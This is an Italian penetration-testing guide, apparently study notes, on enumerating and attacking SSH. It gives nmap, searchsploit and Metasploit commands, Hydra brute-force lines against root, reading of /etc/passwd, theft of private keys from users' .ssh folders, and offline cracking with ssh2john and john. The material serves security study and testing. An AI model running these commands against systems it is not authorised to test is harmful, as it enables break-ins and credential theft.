# SSH Enumeration & Exploitation

**SSH (Secure Shell)** è un protocollo crittografico che consente l’accesso remoto sicuro a sistemi, tipicamente Linux o Unix-like. <br>
Opera sulla porta TCP **22**. <br>
Pur essendo generalmente sicuro, una cattiva configurazione può renderlo un punto di ingresso critico durante un penetration test.

---

## Fase 1 – Scansione e Identificazione del Servizio

Per verificare se SSH è attivo e quale versione è in esecuzione:
`nmap -sV -p 22 <IP>`
Questo comando identifica la versione del servizio SSH. <br>
Un banner può rivelare, ad esempio:
`22/tcp open ssh OpenSSH 7.2p2 Ubuntu 4ubuntu2.10`

Se la versione è obsoleta, puoi cercare vulnerabilità note:
`searchsploit openssh <versione>`

Script Metasploit utili:
- `use auxiliary/scanner/ssh/ssh_version` → rileva la versione SSH
- `use auxiliary/scanner/ssh/ssh_enumusers` → enumera utenti sulla base del timing delle risposte e generalmente trova più utenti rispetto al bruteforce. 

---

## Fase 2 – Brute Force delle Credenziali

### Con Hydra
Hydra è un tool di brute force che supporta diversi protocolli, incluso SSH. Permette di testare combinazioni di credenziali:

`hydra -L <usernameList> -P <passwordList> -t 4 <IP> ssh`

- `-L`: file con la lista degli username
- `-P`: file con la lista delle password
- `-t 4`: numero di thread simultanei

Esempio:
`hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10`

### Con Metasploit

`use auxiliary/scanner/ssh/ssh_login`<br>
`set RHOSTS <IP>`<br>
`set USERNAME <username>`<br>
`set PASS_FILE <path_wordlist>`<br>
`run`<br>

Se il login ha successo, il modulo mostrerà la combinazione valida.

> **Nota:** usa velocità ridotte per evitare blocchi o ban da parte del sistema target.

---

## Fase 3 – Accesso e Verifica Manuale

Una volta ottenute le credenziali:

`ssh <username>@<IP>`

Alla prima connessione comparirà:
`Are you sure you want to continue connecting (yes/no)?`
Rispondi `yes`, poi inserisci la password.

Dopo l’accesso:

- `whoami` → mostra l’utente attivo
- `id` → UID, GID e gruppi
- `cat /etc/passwd` → elenca gli utenti del sistema
- `sudo -l` → comandi eseguibili come root (se configurato)

> **Curiosità:** alcuni utenti SSH possono avere accesso root o sudo senza password in ambienti mal configurati.

---

## Fase 4 – Post Exploitation

### Verifica di Configurazioni Deboli

- Verifica la presenza di `PermitRootLogin yes` in `/etc/ssh/sshd_config`
- Controlla la presenza di chiavi SSH private (`id_rsa`, `id_dsa`) in `/home/<user>/.ssh/`
- Se trovi una chiave `id_rsa`, puoi usarla:

```bash
ssh -i id_rsa <user>@<IP>
```

### Crack delle chiavi trovate
Converti una chiave privata in hash:

```bash
ssh2john id_rsa > rsa_hash.txt
john rsa_hash.txt --wordlist=<wordlist>
```

> Questo permette il brute force offline della chiave trovata.

SSH è sicuro se ben configurato. Tuttavia, l'uso di password deboli, configurazioni permissive o la perdita di chiavi private può facilmente portare a una compromissione completa del sistema.
